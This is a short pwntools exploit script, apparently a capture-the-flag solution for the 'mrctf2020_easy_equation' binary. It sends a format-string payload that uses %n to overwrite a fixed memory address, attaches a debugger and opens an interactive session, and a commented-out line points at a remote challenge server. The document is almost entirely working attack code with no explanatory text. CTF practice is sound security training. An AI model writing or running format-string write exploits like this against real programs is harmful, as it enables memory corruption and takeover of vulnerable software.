from pwn import *
#p=remote("node3.buuoj.cn","29356")
p = process("./mrctf2020_easy_equation")
context.log_level = 'debug'

#payload = "aaaaaaaaa%8$p"
payload = "aa%9$naaa" + p64(0x00000000060105C)

gdb.attach(p)

sleep(0.5)
p.sendline(payload)
pause()


p.interactive()
#8
